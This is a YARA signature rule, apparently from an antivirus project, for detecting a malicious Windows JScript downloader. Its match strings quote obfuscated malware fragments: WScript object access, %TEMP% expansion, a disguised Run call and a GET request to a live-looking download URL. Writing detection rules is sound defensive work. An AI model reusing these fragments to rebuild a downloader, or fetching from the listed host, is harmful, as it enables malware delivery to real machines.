rule sig_20160428_f316a8f7f82274186896874fb9dfe38b {
  meta:
    description = "datamaliciousorder - file 20160428_f316a8f7f82274186896874fb9dfe38b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9592d052446a8f2dd6c45580121449e7b96a840bb486d29731c74a9ef88b24e8"

  strings:
    $s1  = "function JkpUemHfyOqqLdnDxqRer(LtoKetOvoMjfTnlWwaHkz){FtlDpjZypEjmJjxHjpEih[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function SecZlhQshBccUwsCbzNdy() {return FtlDpjZypEjmJjxHjpEih[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function JkpUemHfyOqqLdnDxqRer(LtoKetOvoMjfTnlWwaHkz){FtlDpjZypEjmJjxHjpEih[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var FtlDpjZypEjmJjxHjpEih = function QawYalKsgZiyVdiQftHyt() {return McxZnkFutLesCofOibSii[IrgPxnUadPfxPvyLtoYdk](\"WScript\"+\"" ascii
    $s5  = "JhwXjdQboIzaXseEqbRdo[IsdGohMmbZfbQyeMazLlf](\"G\" + \"ET\", \"http://dotatest.ru/zowjsk\", false);" fullword ascii
    $s6  = "var FtlDpjZypEjmJjxHjpEih = function QawYalKsgZiyVdiQftHyt() {return McxZnkFutLesCofOibSii[IrgPxnUadPfxPvyLtoYdk](\"WScript\"+\"" ascii
    $s7  = "var McxZnkFutLesCofOibSii = this[\"WScript\"];" fullword ascii
    $s8  = "function SecZlhQshBccUwsCbzNdy() {return FtlDpjZypEjmJjxHjpEih[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function FokWefVkmYelTbuUavMwm(JakPaaAabRnbQcmCajDyp, FkgZlvXnwJwoGsfMygCzo){GniRnaQagPowRjbBigSna = GniRnaQagPowRjbBigSna * 1; " ascii
    $s10 = "function MjtWmlQmmLrmZtlErgNwl(){return ZmfVzjGmzGvmHsoOuaLji + \"\";};" fullword ascii
    $s11 = "return JakPaaAabRnbQcmCajDyp - FkgZlvXnwJwoGsfMygCzo;};" fullword ascii
    $s12 = "if (JhwXjdQboIzaXseEqbRdo[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function CyaSsgMelUdmRvdYhyCxl() {return ((SrbCiuCmlKazJukCckAyb == true) && (SrbCiuCmlKazJukCckAyb == NzsRbzDwxZuwJqmKknPlm)) ?" ascii
    $s14 = "function CyaSsgMelUdmRvdYhyCxl() {return ((SrbCiuCmlKazJukCckAyb == true) && (SrbCiuCmlKazJukCckAyb == NzsRbzDwxZuwJqmKknPlm)) ?" ascii
    $s15 = "function KulPxgSolQwiOpsDftRvk()" fullword ascii
    $s16 = "var SrbCiuCmlKazJukCckAyb = false;" fullword ascii
    $s17 = "var UtqElhUokAgkTopBhnZmf = false;" fullword ascii
    $s18 = "NzsRbzDwxZuwJqmKknPlm = true; " fullword ascii
    $s19 = "return FokWefVkmYelTbuUavMwm(1 == 1 ? FhnYxqRnhEvvIfiPjdHqf : 0, 1 == 1 ? DlkQvmDzsDhbCvlQaqUmr : 0);" fullword ascii
    $s20 = "var NzsRbzDwxZuwJqmKknPlm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}